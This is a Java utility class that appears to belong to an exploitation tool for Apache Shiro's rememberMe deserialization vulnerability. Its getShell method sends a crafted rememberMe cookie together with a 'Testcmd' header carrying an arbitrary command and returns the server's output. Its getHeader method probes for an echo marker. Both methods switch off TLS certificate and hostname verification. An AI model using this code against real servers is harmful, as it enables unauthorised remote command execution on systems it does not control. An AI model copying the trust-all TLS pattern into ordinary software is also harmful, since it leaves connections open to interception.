package utils;

import entity.ControllersFactory;
import ui.MainController;

import javax.net.ssl.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.security.SecureRandom;
import java.util.List;
import java.util.Map;

public class HttpUtils {
    static final private MainController myController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
    public static HostnameVerifier allHostsValid = new HostnameVerifier() {
        public boolean verify(String hostname, SSLSession session) {
            return true;
        }
    };
    public static String getShell(String url, String rememberMe, String command) {
        StringBuilder result = new StringBuilder();
        HttpsURLConnection hsc;
        HttpURLConnection hc;
        URLConnection uc;
        BufferedReader in = null;
        try {
            URL realUrl = new URL(url);
            if (url.startsWith("https")){
                SSLContext sslContext = SSLContext.getInstance("SSL");
                TrustManager[] tm = new TrustManager[]{new MyCert()};
                sslContext.init(null, tm, new SecureRandom());
                SSLSocketFactory ssf = sslContext.getSocketFactory();
                hsc = (HttpsURLConnection)realUrl.openConnection();

                hsc.setSSLSocketFactory(ssf);
                hsc.setHostnameVerifier(allHostsValid);
                uc = hsc;
            }else {
                hc = (HttpURLConnection) realUrl.openConnection();
                hc.setRequestMethod("GET");
                hc.setInstanceFollowRedirects(false);
                uc = hc;
            }
            uc.setRequestProperty("Testcmd",command);
            uc.setRequestProperty("Cookie","rememberMe="+rememberMe);
//            uc.connect();
//
//            Map<String, List<String>> headerFields = uc.getHeaderFields();
//            for (String key : headerFields.keySet()) {
//                System.out.println(key + "--->" + headerFields.get(key));
//            }
            in = new BufferedReader(new InputStreamReader(uc.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append(line);
            }
        } catch (Exception e) {
            System.out.println("请求错误!");
            e.printStackTrace();
        }finally {
            try {
                in.close();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        return result.toString();
    }
    public static String getHeader(String url, String rememberMe) {
        String result = null;
        HttpsURLConnection hsc;
        HttpURLConnection hc;
        URLConnection uc;
        try {
            URL realUrl = new URL(url);
            if (url.startsWith("https")){
                SSLContext sslContext = SSLContext.getInstance("SSL");
                TrustManager[] tm = new TrustManager[]{new MyCert()};
                sslContext.init(null, tm, new SecureRandom());
                SSLSocketFactory ssf = sslContext.getSocketFactory();
                hsc = (HttpsURLConnection)realUrl.openConnection();

                hsc.setSSLSocketFactory(ssf);
                hsc.setHostnameVerifier(allHostsValid);
                uc = hsc;
            }else {
                hc = (HttpURLConnection) realUrl.openConnection();
                hc.setRequestMethod("GET");
                hc.setInstanceFollowRedirects(false);
                uc = hc;
            }
            uc.setRequestProperty("Testecho","23f20bfc119b58355179e1f33722f14c");
            uc.setRequestProperty("Cookie","rememberMe="+rememberMe);
            Map<String, List<String>> headerFields = uc.getHeaderFields();
            for (String key : headerFields.keySet()) {
                result += key + " ------> " +headerFields.get(key);
            }
        } catch (Exception e) {
            myController.result.appendText("[-] 请求错误!\n");
            e.printStackTrace();
        }
        return result;
    }

}
